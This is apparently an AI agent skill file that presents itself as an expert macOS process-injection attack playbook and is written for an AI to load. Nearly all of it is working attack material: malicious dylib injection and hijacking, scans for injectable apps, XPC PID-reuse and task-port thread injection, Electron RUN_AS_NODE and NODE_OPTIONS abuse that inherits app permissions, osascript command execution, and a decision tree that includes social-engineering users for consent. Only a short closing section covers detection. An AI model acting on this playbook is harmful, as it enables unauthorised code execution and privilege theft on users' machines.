---
name: macos-process-injection
description: >-
  macOS process injection playbook. Use when you need to inject code into running or launching macOS processes via dylib hijacking, DYLD environment variables, XPC exploitation, Mach port manipulation, or Electron/Chromium abuse.
---

# SKILL: macOS Process Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert macOS process injection techniques. Covers DYLD_INSERT_LIBRARIES, dylib hijacking (weak/rpath/proxy), XPC PID reuse attacks, Mach port manipulation, MIG abuse, and Electron injection. Base models miss entitlement prerequisites and SIP constraints on injection vectors.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [macos-security-bypass](../macos-security-bypass/SKILL.md) when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer escalation (shared object hijacking concepts apply)

### Advanced Reference

Also load [DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md) when you need:
- Step-by-step dylib hijacking methodology with tooling commands
- XPC exploitation walkthrough with code examples
- Mach port technique details and task_for_pid patterns

---

## 1. DYLD_INSERT_LIBRARIES INJECTION

The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib.

### 1.1 Requirements and Restrictions

| Condition | Can Inject? | Reason |
|---|---|---|
| Normal (non-hardened) binary | Yes | No restrictions |
| Hardened Runtime enabled | No | DYLD strips env vars |
| Hardened Runtime + `com.apple.security.cs.allow-dyld-environment-variables` | Yes | Entitlement explicitly allows it |
| Apple system binary (SIP-protected) | No | DYLD env vars stripped by SIP |
| SUID/SGID binary | No | DYLD env vars stripped for privilege safety |
| App Sandbox enabled | No | Sandbox blocks env var injection |

### 1.2 Basic Injection

```bash
# Create malicious dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] Injected into PID %d\n", getpid());
    // payload here
}
EOF

# Compile for both architectures
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# Inject into target
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 Finding Injectable Targets

```bash
# Find apps WITHOUT hardened runtime
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "No Hardened Runtime: $1"
  fi
' _ {} \;

# Find apps with dyld env var entitlement
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD injectable: $1"
' _ {} \;
```

---

## 2. DYLIB HIJACKING

Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones.

### 2.1 Weak Dylib Hijacking (LC_LOAD_WEAK_DYLIB)

Weak dylibs are optional — if missing, the binary still runs. If you can place a dylib at the expected path, it loads.

```bash
# Find binaries with weak dylib references
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# Check if the weak dylib actually exists
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "MISSING (hijackable): $lib"
done
```

### 2.2 @rpath Hijacking

`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.

```bash
# List rpath entries
otool -l /path/to/binary | grep -A 2 LC_RPATH

# List rpath-relative dylib references
otool -L /path/to/binary | grep @rpath

# If rpath includes writable directory (e.g., app's Frameworks/)
# place malicious dylib with matching name there
```

### 2.3 Dylib Proxying

Replace a legitimate dylib with a malicious one that forwards all exports to the original.

```bash
# Step 1: Identify target dylib and its exports
nm -gU /path/to/original.dylib | awk '{print $3}'

# Step 2: Create proxy dylib that re-exports everything
# Move original to original_real.dylib
# Create proxy:
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // malicious code here
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 Dependency Enumeration

```bash
otool -L /path/to/binary              # List all dylib dependencies
otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)
dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)
```

---

## 3. XPC EXPLOITATION

XPC (Cross-Process Communication) is macOS's primary IPC mechanism for privilege separation. Privileged XPC services are high-value targets.

### 3.1 XPC Service Discovery

```bash
# System XPC services
find /System/Library -name "*.xpc" -type d 2>/dev/null | head -20

# Third-party XPC services
find /Library /Applications -name "*.xpc" -type d 2>/dev/null

# LaunchDaemon XPC services (root-level)
grep -r "MachServices" /Library/LaunchDaemons/*.plist 2>/dev/null
grep -r "MachServices" /System/Library/LaunchDaemons/*.plist 2>/dev/null
```

### 3.2 PID Reuse Attack

XPC connections validated by PID are vulnerable to race conditions: attacker spawns process, PID is checked and passes, attacker's process exits, OS reuses PID for malicious process.

| Validation Method | Vulnerable? | Notes |
|---|---|---|
| PID-based check | Yes | PID recycled after process exit |
| Audit token | No | Unique per process lifecycle, not recycled |
| Code signature check | No | Validates signing identity |
| Entitlement check | No | Checks process entitlements |

```
Timeline of PID reuse attack:
1. Legitimate client (PID 1234) connects to XPC service
2. XPC service checks PID 1234 → valid
3. Legitimate client exits (PID 1234 freed)
4. Attacker rapidly forks to get PID 1234
5. Attacker's process (now PID 1234) sends malicious XPC message
6. XPC service trusts PID 1234 (cached validation)
```

### 3.3 XPC Client Validation Weaknesses

| Weakness | Description | Exploitation |
|---|---|---|
| No client validation | Service accepts any connection | Connect directly, send commands |
| PID-only validation | Race condition exploitable | PID reuse attack (§3.2) |
| Bundle ID check only | Bundle IDs can be spoofed | Create app with matching bundle ID |
| Partial code requirement | Missing anchor checks | Sign with any cert matching partial requirement |
| Entitlement check on wrong process | Checks parent instead of client | Spawn from entitled parent |

---

## 4. MACH PORT MANIPULATION

Mach ports are the kernel-level IPC primitive underlying XPC. Direct Mach port access enables powerful injection.

### 4.1 Task Port (task_for_pid)

```c
// Requires root or taskgated entitlement
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr == KERN_SUCCESS) {
    // Can now read/write target process memory
    // Can inject threads via thread_create_running
}
```

| Access Method | Requirement | Post-Exploit Capability |
|---|---|---|
| `task_for_pid()` | Root + not SIP-protected target | Full memory R/W, thread injection |
| `processor_set_tasks()` | Root + `com.apple.system-task-ports` | Enumerate all task ports |
| Exception ports | Set via `task_set_exception_ports` | Catch target crashes, redirect execution |
| Thread injection | Task port obtained | Create new thread in target address space |

### 4.2 Port Namespace Manipulation

| Technique | Description |
|---|---|
| Port name guessing | Mach port names are sequential integers — brute-forceable in some contexts |
| `mach_port_insert_right` | Insert send right into target's namespace (requires task port) |
| Bootstrap server abuse | Register service name before legitimate service → intercept connections |

---

## 5. MIG (MACH INTERFACE GENERATOR) ABUSE

MIG generates C stubs for Mach IPC. MIG servers may have vulnerabilities in their dispatch routines.

### 5.1 Analysis Approach

```bash
# Find MIG subsystems in a binary
nm /path/to/binary | grep _subsystem
strings /path/to/binary | grep "MIG"

# Identify MIG routine dispatch tables
otool -tV /path/to/binary | grep -A 5 "server_routine"
```

### 5.2 Common MIG Vulnerabilities

| Vulnerability | Description |
|---|---|
| Missing audit token validation | MIG handler doesn't verify sender identity |
| Type confusion | MIG deserialization trusts client-provided type descriptors |
| Port lifecycle issues | Use-after-deallocate on Mach ports between MIG calls |
| OOL (out-of-line) memory abuse | Oversized OOL descriptors → kernel memory issues |

---

## 6. ELECTRON / CHROMIUM INJECTION

Many macOS apps use Electron (Slack, Discord, VS Code, Teams, etc.). Electron apps expose multiple injection surfaces.

### 6.1 ELECTRON_RUN_AS_NODE

```bash
# Turns Electron app into a plain Node.js runtime
ELECTRON_RUN_AS_NODE=1 "/Applications/Slack.app/Contents/MacOS/Slack" -e \
  "require('child_process').execSync('id').toString()"

# This inherits the app's TCC permissions!
# If Slack has camera/mic/screen recording, your code gets it too.
```

### 6.2 Debugging Flags

```bash
# Open Chrome DevTools protocol on the app
"/Applications/Target.app/Contents/MacOS/Target" --inspect=9229
# Then connect: chrome://inspect in Chrome browser

# Break before any code runs
"/Applications/Target.app/Contents/MacOS/Target" --inspect-brk=9229
```

### 6.3 NODE_OPTIONS Injection

```bash
# Inject preload script via NODE_OPTIONS
echo 'require("child_process").execSync("id > /tmp/pwned")' > /tmp/preload.js
NODE_OPTIONS="--require /tmp/preload.js" "/Applications/Target.app/Contents/MacOS/Target"
```

### 6.4 Electron Fuses

Modern Electron apps use "fuses" to disable dangerous features. Check fuse state:

| Fuse | When Enabled (secure) | When Disabled (exploitable) |
|---|---|---|
| `RunAsNode` | ELECTRON_RUN_AS_NODE stripped | Can use app as Node.js |
| `EnableNodeCliInspectArguments` | --inspect flags stripped | Can attach debugger |
| `EnableNodeOptionsEnvironmentVariable` | NODE_OPTIONS stripped | Can inject preload |
| `OnlyLoadAppFromAsar` | Only loads from .asar | Can replace JS files |

```bash
# Check electron fuse status (requires npx @electron/fuses)
npx @electron/fuses read --app "/Applications/Target.app"
```

---

## 7. APPLICATION SCRIPTING (APPLE EVENTS)

```bash
# Inject via osascript (if Automation permission exists)
osascript -e 'tell application "Terminal" to do script "id > /tmp/pwned"'

# JavaScript for Automation (JXA)
osascript -l JavaScript -e '
  var app = Application("Terminal");
  app.doScript("id > /tmp/pwned");
'

# JXA with ObjC bridge (powerful)
osascript -l JavaScript -e '
  ObjC.import("Cocoa");
  var task = $.NSTask.alloc.init;
  task.launchPath = "/bin/bash";
  task.arguments = ["-c", "id > /tmp/pwned"];
  task.launch;
'
```

---

## 8. PROCESS INJECTION DECISION TREE

```
Need to inject code into macOS process
│
├── Target uses Electron?
│   ├── Fuses disabled? → ELECTRON_RUN_AS_NODE (§6.1)
│   ├── Debugging available? → --inspect flag (§6.2)
│   ├── NODE_OPTIONS not stripped? → preload injection (§6.3)
│   └── All fuses on? → check dylib path or XPC
│
├── Target has dylib env var entitlement?
│   └── Yes → DYLD_INSERT_LIBRARIES (§1)
│
├── Target has missing or weak dylib?
│   ├── LC_LOAD_WEAK_DYLIB with missing lib? → place dylib (§2.1)
│   ├── @rpath with writable dir first in search? → rpath hijack (§2.2)
│   └── Existing dylib in writable location? → dylib proxy (§2.3)
│
├── Target exposes XPC service?
│   ├── No client validation? → connect directly (§3.3)
│   ├── PID-only validation? → PID reuse attack (§3.2)
│   └── Audit token validation? → need different vector
│
├── Have root access?
│   ├── Target not SIP-protected? → task_for_pid injection (§4.1)
│   └── SIP-protected? → need SIP bypass first (→ macos-security-bypass)
│
├── Can use Apple Events?
│   ├── Automation permission for target? → osascript injection (§7)
│   └── No permission? → social engineer Automation consent
│
└── None of the above?
    ├── Check for MIG server vulnerabilities (§5)
    └── Look for bootstrap server name collision (§4.2)
```

---

## 9. DETECTION & FORENSICS

| Artifact | Where to Look |
|---|---|
| DYLD_INSERT_LIBRARIES use | Process environment (`/proc/PID/environ`, `ps eww`) |
| Unexpected dylibs loaded | `vmmap PID` or `DYLD_PRINT_LIBRARIES=1` output |
| XPC connection anomalies | Endpoint Security `es_event_type_t` XPC events |
| Electron debug port open | `lsof -i :9229` |
| osascript execution | Unified log: `log show --predicate 'process=="osascript"'` |
| Unsigned code execution | `codesign --verify` failures, Gatekeeper logs |
